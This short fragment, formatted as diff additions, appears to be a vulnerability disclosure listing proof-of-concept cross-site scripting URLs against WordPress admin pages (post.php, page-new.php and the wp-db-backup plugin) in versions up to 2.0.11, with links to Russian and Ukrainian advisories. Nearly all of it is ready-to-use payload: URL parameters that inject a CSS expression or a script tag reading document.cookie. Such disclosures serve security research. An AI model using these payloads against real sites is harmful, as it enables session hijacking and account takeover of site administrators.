@@ -1,0 +1,9 @@
+http://site/wp-admin/post.php?popuptitle=%22%20style=%22xss:expression(alert(document.cookie))%22
+http://site/wp-admin/page-new.php?popuptitle=%22%20style=%22xss:expression(alert(document.cookie))%22
+
+    Original article (in Russian): http://securityvulns.ru/Sdocument714.html
+    Additional details (in Ukrainian): http://websecurity.com.ua/1658/
+
+      XSS (WordPress &lt;= 2.0.11 and potentially 2.1.x, 2.2.x, 2.3.x):
+
+http://site/wp-admin/edit.php?page=wp-db-backup.php&amp;backup=%3Cscript%3Ealert(document.cookie)%3C/script%3E
